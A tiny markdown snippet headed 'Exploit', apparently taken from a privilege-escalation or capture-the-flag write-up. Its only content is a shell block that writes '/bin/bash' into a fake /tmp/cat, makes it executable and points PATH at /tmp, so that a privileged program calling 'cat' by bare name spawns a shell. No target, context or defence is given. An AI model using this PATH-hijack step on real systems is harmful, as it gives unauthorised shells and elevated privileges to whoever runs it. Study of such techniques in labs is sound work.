### Exploit
```shell
    echo '/bin/bash' > /tmp/cat
    chmod 777 /tmp/cat

    export PATH="/tmp"
```
